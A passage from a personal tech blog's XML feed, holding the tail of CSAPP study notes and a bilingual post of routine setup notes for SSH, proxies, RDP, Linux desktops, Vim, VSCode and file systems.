libraries</li><li>Stack<ul><li>expand when call function, contract when return from function</li></ul></li><li>Kernel virtual memory<ul><li>not allowed to r/w by applications</li></ul></li></ul><h5 id="files"><a class="markdownIt-Anchor" href="#files"></a> Files</h5><p>a sequence of bytes</p><p>The notion of file providing a uniform view of varied I/O devices for applications.</p><p>Figure 1.14: A network is another I/O device</p><h3 id="amdahls-law"><a class="markdownIt-Anchor" href="#amdahls-law"></a> Amdahl’s Law</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo>=</mo><mfrac><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub><msub><mi>T</mi><mrow><mi>n</mi><mi>e</mi><mi>w</mi></mrow></msub></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi mathvariant="normal">ɑ</mi><mo stretchy="false">)</mo><mo>+</mo><mi mathvariant="normal">ɑ</mi><mi mathvariant="normal">/</mi><mi>k</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">S=\frac{T_{old}}{T_{new}}=\frac{1}{(1-ɑ)+ɑ/k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3392909999999998em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.894191em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.13889em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.13889em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">o</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mtight">ɑ</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">ɑ</span><span class="mord mtight">/</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><h3 id="concurrency-and-parallelism"><a class="markdownIt-Anchor" href="#concurrency-and-parallelism"></a> Concurrency and Parallelism</h3><p>two constant demands : do more, run faster</p><p><em>concurrency</em> for more, <em>parallelism</em> for faster</p><h4 id="thread-level-concurrency"><a class="markdownIt-Anchor" href="#thread-level-concurrency"></a> Thread-Level Concurrency</h4><p><em>concurrency</em> = multiple+simultaneous</p><p>Uniprocessor system can only <em>simulate</em> concurrent execution.</p><p><strong>Hyperthreading</strong> (<em>simultaneous multi-threading</em>) allows a single CPU to execute multiple flows of control, which involves multiple copies of some CPU hardware and only single copies of other parts.</p><p>Multiprocessing improve both multiple tasks (reduce simulation of concurrency) and single program (only if expressed in terms of multiple threads).</p><h4 id="instruction-level-parallelism"><a class="markdownIt-Anchor" href="#instruction-level-parallelism"></a> Instruction-Level Parallelism</h4><p><em>pipelining</em> partition the instructions into different steps and processor is organized as a series of stages that can operate in parallel, each performing one of these steps.</p><p><em>superscalar</em> processors can sustain execution rates faster than 1 instruction per cycle</p><h4 id="simd-parallelism"><a class="markdownIt-Anchor" href="#simd-parallelism"></a> SIMD Parallelism</h4><p>single-instruction, multiple data</p><h3 id="abstractions"><a class="markdownIt-Anchor" href="#abstractions"></a> Abstractions</h3><p>add <em>virtual machine</em> to Figure 1.11</p><p><a href="http://csapp.cs.cmu.edu/3e/ics3/intro/abstractions-multi.pdf">Figure 1.18: Some abstractions provided by a computer system</a></p><p>(Remember it!)</p><h2 id="ch2-representing-and-manipulating-information"><a class="markdownIt-Anchor" href="#ch2-representing-and-manipulating-information"></a> Ch2 Representing and Manipulating Information</h2><p>three most important representations of numbers:</p><ul><li>unsigned encodings</li><li>two’s-complement encodings</li><li>floating-point encodings</li></ul><p><em>overflow</em></p><ul><li>incorrect but consistent<ul><li>multiplication is associative and commutative</li></ul></li><li>inconsistent<ul><li>floating-point arithmetic</li></ul></li></ul><h3 id="information-storage"><a class="markdownIt-Anchor" href="#information-storage"></a> Information Storage</h3>]]></content>
    
    
    <categories>
      
      <category>计算机理论</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
      <tag>长期</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Setup</title>
    <link href="/2020/10/28/Problems-of-Setup/"/>
    <url>/2020/10/28/Problems-of-Setup/</url>
    
    <content type="html"><![CDATA[<h2 id="network"><a class="markdownIt-Anchor" href="#network"></a> Network</h2><h3 id="ssh"><a class="markdownIt-Anchor" href="#ssh"></a> SSH</h3><h4 id="key-auth"><a class="markdownIt-Anchor" href="#key-auth"></a> Key-Auth</h4><p><code>ssh-keygen -t rsa</code></p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">host &#123;shortName&#125;    Hostname &#123;address&#125;    Port 22    User &#123;username&#125;    IdentityFile &#123;path&#x2F;to&#x2F;key&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>do not forget to set private key <code>600</code></p><h4 id="win10-openssh-server"><a class="markdownIt-Anchor" href="#win10-openssh-server"></a> <a href="https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse">Win10-OpenSSH-Server</a></h4><ul><li><p>Install from Settings UI : Optional Features</p></li><li><p>Install from PowerShell : <code>Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0</code></p></li><li><h6 id="start-service"><a class="markdownIt-Anchor" href="#start-service"></a> ===Start-Service</h6></li></ul><div class="code-wrapper"><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Start-Service</span> sshd <span class="token comment"># OPTIONAL but recommended: </span><span class="token function">Set-Service</span> <span class="token operator">-</span>Name sshd <span class="token operator">-</span>StartupType <span class="token string">'Automatic'</span><span class="token comment"># then back to local machine:</span>ssh username@servername<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h4 id="win32-openssh"><a class="markdownIt-Anchor" href="#win32-openssh"></a> <a href="https://github.com/PowerShell/Win32-OpenSSH">Win32-OpenSSH</a></h4><p>PS: <code>Set-ExecutionPolicy RemoteSigned</code><br />or <code>powershell -ExecutionPolicy Bypass -File .\install-sshd.ps1</code></p><h4 id="ssh-tunnel"><a class="markdownIt-Anchor" href="#ssh-tunnel"></a> SSH-Tunnel</h4><p><a href="http://wlwang41.github.io/content/ops/ssh%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86.html">http://wlwang41.github.io/content/ops/ssh隧道代理.html</a></p><p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/</a></p><h4 id="sshfs"><a class="markdownIt-Anchor" href="#sshfs"></a> SSHFS</h4><p><code>sshfs -C -o reconnect,ServerAliveInterval=15,ServerAliveCountMax=3 &lt;server&gt;:/path /path</code></p><h3 id="proxy"><a class="markdownIt-Anchor" href="#proxy"></a> Proxy</h3><div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">export http_proxy&#x3D;&quot;http:&#x2F;&#x2F;localhost:1082&#x2F;&quot;export https_proxy&#x3D;&quot;http:&#x2F;&#x2F;localhost:1082&#x2F;&quot;export ftp_proxy&#x3D;&quot;http:&#x2F;&#x2F;localhost:1082&#x2F;&quot;export socks_proxy&#x3D;&quot;http:&#x2F;&#x2F;localhost:1080&quot;export no_proxy&#x3D;&quot;127.0.0.1,localhost&quot;export ALL_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><code>apt</code>: <code>/etc/apt/apt.conf.d/12proxy</code></p><div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Acquire &#123;  HTTP::proxy &quot;http:&#x2F;&#x2F;127.0.0.1:1082&quot;;  HTTPS::proxy &quot;socks5h:&#x2F;&#x2F;127.0.0.1:1080&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><p><code>Git</code>: <code>git config --global http.proxy 127.0.0.1:1082</code></p><p><a href="https://docs.docker.com/config/daemon/systemd/"><code>Docker</code></a></p><p><a href="https://note.qidong.name/2020/05/docker-proxy/">https://note.qidong.name/2020/05/docker-proxy/</a></p><h4 id="server"><a class="markdownIt-Anchor" href="#server"></a> Server</h4><p><code>./ew -s ssocksd -l 1080</code></p><h4 id="client"><a class="markdownIt-Anchor" href="#client"></a> Client</h4><p><code>tsocks</code>: <code>/etc/tsocks.conf</code></p><p><code>proxychains</code>: <code>/etc/proxychains.conf</code></p><h3 id="rdp"><a class="markdownIt-Anchor" href="#rdp"></a> RDP</h3><p><strong>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp</strong></p><p><strong>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</strong></p><p><code>PortNumber</code> then restart</p><p>(官方文档只列出第二处)</p><h3 id="aria2"><a class="markdownIt-Anchor" href="#aria2"></a> Aria2</h3><p><a href="https://p3terx.com/archives/aria2_perfect_config-faq.html">Aria2常见问题</a></p><h2 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h2><h3 id="power"><a class="markdownIt-Anchor" href="#power"></a> Power</h3><p>合盖的不同设定：</p><ul><li>poweroff 和 halt 均是关机（具体实现有区别）</li><li>hybernate 是休眠，设备断电（同关机状态），内容保存在硬盘中</li><li>hybrid-sleep 是混合睡眠，设备通电，内容保存在硬盘和内存中</li><li>supspend (或 sleep)是挂起（睡眠），设备通电，内容保存在内存中</li><li>lock 是锁屏</li><li>kexec 是从当前正在运行的内核直接引导到一个新内核（多用于升级了内核的情况下）</li><li>ignore 是忽略该动作，即不进行任何电源事件响应</li></ul><h4 id="reisub"><a class="markdownIt-Anchor" href="#reisub"></a> REISUB</h4><ul><li>Add to your grub <code>GRUB_CMDLINE_LINUX_DEFAULT</code> the <code>sysrq_always_enabled=1</code> variable.<br />OR</li><li>Execute <code>echo kernel.sysrq=1 | sudo tee --append /etc/sysctl.d/99-sysctl.conf</code><br />AND</li><li>Execute <code>sudo update-grub</code></li></ul><p>Laptop: <code>Fn+Alt+PrtSc</code></p><p>Once you’ve located your SysRq key, please <em>keep the</em> Alt <em>key pressed</em>.</p><h3 id="package-manager"><a class="markdownIt-Anchor" href="#package-manager"></a> Package Manager</h3><h4 id="pacman"><a class="markdownIt-Anchor" href="#pacman"></a> pacman</h4><p>speed up : <code>XferCommand = /usr/bin/aria2c -x 8 -s 8 --dir $(dirname %o) -o $(basename %o) %u</code></p><p><code>-S</code> <code>-U</code> <code>-Q</code> <code>-R</code></p><h3 id="shell"><a class="markdownIt-Anchor" href="#shell"></a> Shell</h3><h4 id="konsole"><a class="markdownIt-Anchor" href="#konsole"></a> Konsole</h4><p><code>&lt;c-(&gt;</code> <code>&lt;c-)&gt;</code> split</p><h4 id="yakuake"><a class="markdownIt-Anchor" href="#yakuake"></a> Yakuake</h4><p>New Session <code>&lt;c-s-T&gt;</code></p><p>Close Session <code>&lt;c-s-W&gt;</code></p><p>Next Session <code>&lt;s-Right&gt;</code> (’<c-tab>’)</p><h3 id="kde"><a class="markdownIt-Anchor" href="#kde"></a> KDE</h3><p>Add Panel to the top, <code>Global Menu</code> added by default</p><p>Install widget <code>Active Window Control</code> to hide title bar for maximized windows</p><p>Install <code>latte-dock</code> to imitate OS X. Finally I chose to add widget <code>Icons-Only Task Manager</code> to the right of the panel.</p><p><img src="/img/KDE.png" alt="KDE" /></p><h3 id="fcitx5"><a class="markdownIt-Anchor" href="#fcitx5"></a> Fcitx5</h3><p><code>&lt;c-7&gt;</code> to remove word from history</p><p><code>&lt;c-;&gt;</code> to show clipboard by default, having been reset to <code>&lt;c-'&gt;</code></p><p>UNICODE: <code>Ctrl+Alt+Shift+U</code></p><h2 id="development"><a class="markdownIt-Anchor" href="#development"></a> Development</h2><h3 id="git"><a class="markdownIt-Anchor" href="#git"></a> Git</h3><p>使用ssh代替https进行git远程操作可以省去每次输入帐号的重复步骤，尽管一开始的密钥配置会略显繁琐。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"Whatever"</span><span class="token comment">#输入文件名，按两次回车</span><span class="token comment">#ssh-agent -s 无效，则用下面这条</span><span class="token builtin class-name">eval</span> <span class="token variable"><span class="token variable">$(</span>ssh-agent -s<span class="token variable">)</span></span>ssh-add ~/.ssh/id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>但若场景要求使用不同的身份进行git操作，则单一的SSH Key就不足以应付，需要生成多个SSH Key。而对应不同的远程主机显然需要不同的Key来连接，这种对应规则就在<code>~/.ssh/config</code>这一文件中，注意Host,HostName即可</p><p><a href="https://www.awaimai.com/2200.html">Git配置多个SSH Key</a></p><p><a href="https://www.barretlee.com/blog/2016/03/09/config-in-ssh-after-troubling-git-connection/">多SSH管理技巧与Git多账户登录</a></p><p>undo the first commit: <code>git update-ref -d HEAD</code></p><h3 id="vim"><a class="markdownIt-Anchor" href="#vim"></a> Vim</h3><p>fail to install plugins</p><h5 id="quick-comment"><a class="markdownIt-Anchor" href="#quick-comment"></a> quick comment</h5><ul><li><code>&lt;c-V&gt;</code> to enter visual block mode</li><li>move around to select lines to comment</li><li>press <code>&lt;s-I&gt;</code> and insert <code>#</code> or <code>//</code></li><li><code>&lt;Esc&gt;</code> then see changes</li></ul><h5 id="clipboard-inconsistency"><a class="markdownIt-Anchor" href="#clipboard-inconsistency"></a> <a href="https://wiki.archlinux.org/index.php/Vim#Clipboard">clipboard inconsistency</a></h5><p>vim does not support Xorg, missing the <code>+clipboard</code> support. replace it with <code>gvim</code></p><p>use <code>&quot;+y</code> to copy to the system clipboard</p><p>to change the default behavior <code>set clipboard=unnamedplus</code></p><h5 id="resize-window"><a class="markdownIt-Anchor" href="#resize-window"></a> <a href="https://harttle.land/2015/11/14/vim-window.html">resize window</a></h5><p><code>&lt;c-W&gt;</code> <code>-/+</code>上下 <code>&lt;&gt;</code>左右</p><h5 id="encode"><a class="markdownIt-Anchor" href="#encode"></a> encode</h5><p><code>enc,fenc,fencs,tenc</code></p><ul><li><p><code>enc</code> (<code>encoding</code>) 内部使用的编码</p><p>如buffer，寄存器中的字符串。在Vim打开文本后，如果它的编码方式与它的内部编码不一致，Vim会先把编码转换成内部编码，如果它用的编码中含有没法转换为内部编码的字符，那么这些字符就会丢失掉。默认值是系统的locale来决定。</p></li><li><p><code>fenc</code>( <code>fileencoding</code>) 文件自身的编码</p><p>从磁盘读文件时，Vim会对文件编码检查，如果文件的编码与Vim内部编码（enc）不同，Vim就会对文本做编码转换，将fenc设置为文件的编码。Vim写文件到磁盘时，如果enc与fenc不一样，Vim就做编码转换，转换成编码fenc保存文件。</p></li><li><p><code>fencs</code>( <code>fileencodings</code> ) 字符编码的列表</p><p>编码的自动识别就是通过设置fencs实现的。当打开一个文件时，Vim会按照fencs中编码的顺序进行解码操作，如果匹配成功就用该编码来进行解码，并把这种编码设为fenc的值。这里的匹配成功指的是Vim能正确解码，不会出错，但是不保证没有乱码，所以fencs编码列表的顺序设置很关键。latin1是iso8859-1，属于国际化的标准编码，能表示任何字符，所以放到最后</p></li><li><p><code>tenc</code>( <code>termencoding</code>) 终端使用文本编码，或者说是Vim用于屏幕显示时的编码，显示的时候Vim会把内部编码转换为屏幕编码再输出，也就是说我们从屏幕上看到的字符都是tenc编码的字符，如果为空，默认就是enc。windows平台Gvim会忽略掉tenc。一般就是从一个终端远程登陆到linux系统时候tenc会起作用。</p></li></ul><h3 id="vscode"><a class="markdownIt-Anchor" href="#vscode"></a> VSCode</h3><p><code>Window: Title Bar Style</code>  choose <code>custom</code></p><h5 id="shortcuts"><a class="markdownIt-Anchor" href="#shortcuts"></a> Shortcuts</h5><p><code>&lt;c-B&gt;</code> toggle side bar</p><p><code>&lt;c-J&gt;</code> toggle panel</p><p><code>&lt;c-`&gt;</code>toggle integrated terminal</p><p><code>&lt;c-K&gt;</code> leader key</p><ul><li><code>&lt;c-O&gt;</code> Open Folder</li><li><code>&lt;c-S&gt;</code> Keyboard Shortcut</li></ul><h5 id="vscodevim"><a class="markdownIt-Anchor" href="#vscodevim"></a> vscodevim</h5><p>set a shortcut to “Vim: Toggle Vim Mode”</p><ul><li>press <code>&lt;c-K&gt;&lt;c-S&gt;</code>,search for it</li><li>bind it to <code>Ctrl+;</code> (then change the shortcut of fcitx5 clipboard, eg.<code>Ctrl+'</code>)</li></ul><p>press <code>gcc</code> to comment</p><h5 id="filesexclude"><a class="markdownIt-Anchor" href="#filesexclude"></a> <a href="https://code.visualstudio.com/Docs/customization/userandworkspace">files.exclude</a></h5><ul><li><p>Go to <strong>File -&gt; Preferences -&gt; Settings</strong> (or on Mac <strong>Code -&gt; Preferences -&gt; Settings</strong>)</p></li><li><p>Pick the <code>workspace settings</code> tab</p></li><li><p>Add this code to the <code>settings.json</code> file displayed on the right side:</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token comment">// Place your settings in this file to overwrite default and user settings.</span><span class="token punctuation">&#123;</span>    <span class="token property">"settings"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"files.exclude"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"**/.git"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>         <span class="token comment">// this is a default value</span>            <span class="token property">"**/.DS_Store"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token comment">// this is a default value</span>            <span class="token property">"**/node_modules"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// this excludes all folders </span>                                    <span class="token comment">// named "node_modules" from </span>                                    <span class="token comment">// the explore tree</span>            <span class="token comment">// alternative version</span>            <span class="token property">"node_modules"</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token comment">// this excludes the folder </span>                                    <span class="token comment">// only from the root of</span>                                    <span class="token comment">// your workspace </span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h5 id="remote"><a class="markdownIt-Anchor" href="#remote"></a> remote</h5><p><code>Code-OSS</code> does not work</p><h5 id="large-workspace"><a class="markdownIt-Anchor" href="#large-workspace"></a> large workspace</h5><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/sys/fs/inotify/max_user_watches<span class="token builtin class-name">echo</span> fs.inotify.max_user_watches<span class="token operator">=</span><span class="token number">524288</span> <span class="token operator">>></span> /etc/sysctl.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p><a href="https://gist.github.com/tbjgolden/c53ca37f3bc2fab8c930183310918c8c">For Arch</a>:</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /etc/sysctl.d/*-max_user_watches.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> fs.inotify.max_user_watches<span class="token operator">=</span><span class="token number">524288</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/sysctl.d/50-max_user_watches.conf <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> sysctl --system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/sys/fs/inotify/max_user_watches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><h3 id="codeblocks"><a class="markdownIt-Anchor" href="#codeblocks"></a> CodeBlocks</h3><p>Missing <code>api-ms-win-crt-*.dll</code></p><p>Install VC++ 2015 Redistributable</p><p>Fail on Windows Server 2012</p><h3 id="win7"><a class="markdownIt-Anchor" href="#win7"></a> Win7</h3><p>only support Python3.8, does not support Docker</p><p>KB3063858 if fail to install Python</p><h3 id="sql"><a class="markdownIt-Anchor" href="#sql"></a> SQL</h3><p><code>mysql -u &#123;user&#125; -p</code> ENTER</p><h2 id="file-system"><a class="markdownIt-Anchor" href="#file-system"></a> File System</h2><p><code>lsblk</code></p><p><code>df -hl</code></p><h4 id="lvm"><a class="markdownIt-Anchor" href="#lvm"></a> LVM</h4><p><code>pvs</code>, <code>pvcreate /dev/&lt;foo&gt;</code></p><p><code>vgs</code> <code>vgextend VG PV</code></p><p><code>lvs</code> <code>lvresize -l 100%FREE VG/LV</code></p><p><code>resize2fs VG/LV</code> 别忘了<strong>文件系统扩容</strong></p><h4 id="ntfs"><a class="markdownIt-Anchor" href="#ntfs"></a> NTFS</h4><p><code>sudo mount -t ntfs-3g /dev/nvme0n1p4 /path/to/mount</code></p><h4 id="nfs"><a class="markdownIt-Anchor" href="#nfs"></a> NFS</h4><p><a href="https://abelsu7.top/2019/10/17/centos7-install-nfs/">CentOS 7安装配置NFS</a><br /><a href="https://qizhanming.com/blog/2018/08/08/how-to-install-nfs-on-centos-7">CentOS 7 下 yum 安装和配置 NFS</a></p><p>Server:</p><ul><li>create folder</li><li>start servers <code>rpcbind</code> <code>nfs-server</code></li><li>edit <code>/etc/exports</code><ul><li><code>exportfs -r</code></li><li><code>showmount -e</code></li></ul></li></ul><p>Client:</p><ul><li><code>rpcbind</code></li><li><code>mount [IP]:/ /path/to/mount</code></li></ul><p>MPICH</p><p><a href="https://stackoverflow.com/questions/14769599/mpi-error-loading-shared-libraries">https://stackoverflow.com/questions/14769599/mpi-error-loading-shared-libraries</a></p><h2 id="總結"><a class="markdownIt-Anchor" href="#總結"></a> 總結</h2><p><a href="https://www.echoxu.cn/others/">用心记,放心阅,方便查</a></p><p><a href="https://mrswolf.github.io/zh-cn/2019/05/24/manjaro%E8%B8%A9%E5%9D%91%E8%AE%B0/">Manjaro踩坑记</a></p><p><a href="https://askubuntu.com/questions/906674/accidentally-removed-bin-how-do-i-restore-it">after remove /bin</a></p><p><a href="https://unix.stackexchange.com/questions/342598/how-to-remove-a-file-without-using-rm">delete file without <code>rm</code></a> <code>shred -u</code> <code>unlink</code></p><h3 id="问题记录"><a class="markdownIt-Anchor" href="#问题记录"></a> 问题记录</h3><h4 id="ubuntu-1604-to-1804-断网"><a class="markdownIt-Anchor" href="#ubuntu-1604-to-1804-断网"></a> <a href="https://askubuntu.com/questions/1021884/no-internet-after-upgrade-from-16-04-to-18-04">Ubuntu 16.04 to 18.04 断网</a></h4><p>能 ping 固定 IP 但 ping 不通域名</p><p>edit <code>/etc/systemd/resolved.conf</code>, let <code>DNS=8.8.8.8</code></p><p><code>systemctl restart systemd-resolved</code></p><p>DO NOT EDIT <code>/etc/resolv.conf</code> with <code>127.0.0.53</code> as a **stub resolver **!</p><h4 id="kde-桌面崩溃"><a class="markdownIt-Anchor" href="#kde-桌面崩溃"></a> KDE 桌面崩溃</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kquitapp5 plasmashellkstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h4 id="触摸板突然失灵"><a class="markdownIt-Anchor" href="#触摸板突然失灵"></a> 触摸板突然失灵</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> modprobe -r i2c_hid <span class="token comment"># 先卸载模块,或psmouse</span><span class="token function">sudo</span> modprobe i2c_hid <span class="token comment"># 再装上模块</span><span class="token function">sudo</span> systemctl daemon-reload <span class="token comment">#非必须</span>sytemctl <span class="token function">suspend</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><h4 id="vmware报错"><a class="markdownIt-Anchor" href="#vmware报错"></a> VMWare报错</h4><p>先检查是否装对应kernel版本的linux-headers</p><p>每次开机后再输<code>sudo modprobe -a vmw_vmci vmmon</code></p><p>上述命令亦无效则是kernel版本太新尚无module可用，参见<a href="https://communities.vmware.com/thread/638824">此贴</a>中的步骤，下载<a href="https://github.com/mkubecek/vmware-host-modules">该仓库</a>中对应版本执行<code>make</code>即可编译完成</p><p>vmnet8报错无法联网：<code>sudo systemctl start vmware-networks.service</code></p><h4 id="基于qt的软件无法使用fcitx"><a class="markdownIt-Anchor" href="#基于qt的软件无法使用fcitx"></a> <a href="https://zhuanlan.zhihu.com/p/150387095">基于Qt的软件无法使用fcitx</a></h4><p><code>qmake -query</code>查看qt版本及路径等信息</p><h3 id="中文字体选择"><a class="markdownIt-Anchor" href="#中文字体选择"></a> 中文字体选择</h3><p><a href="https://feeshy.github.io/tech/web_safe_fonts.html">常用Web字体</a></p><p><a href="http://tool.pfan.cn/font">网页字体测试</a></p><p><a href="http://edyfox.codecarver.org/html/debian_testing_chinese.html">KDE中文字体美化</a></p>]]></content>
    
    
    <categories>
      
      <category>记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>长期</tag>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(译)因循的四象限</title>
    <link href="/2020/10/28/The-Four-Quadrants-of-Conformism/"/>
    <url>/2020/10/28/The-Four-Quadrants-of-Conformism/</url>
    
